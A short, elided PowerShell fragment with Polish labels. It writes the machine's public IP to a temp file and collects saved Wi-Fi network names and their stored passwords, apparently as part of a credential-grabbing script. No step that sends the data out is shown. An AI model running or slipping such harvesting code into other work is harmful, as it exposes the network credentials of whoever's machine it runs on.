...
$PubIP = Get-PubIP
if ($PubIP) { echo "`nTwoj adres IP: $PubIP" >> $Env:temp\foo.txt }
...
Foreach($WLANProfileName in $WLANProfileNames){
    ...
    $WLANProfileObject | Add-Member -Type NoteProperty -Name "Nazwa Sieci" -Value $WLANProfileName
    $WLANProfileObject | Add-Member -Type NoteProperty -Name "Haslo" -Value $WLANProfilePassword
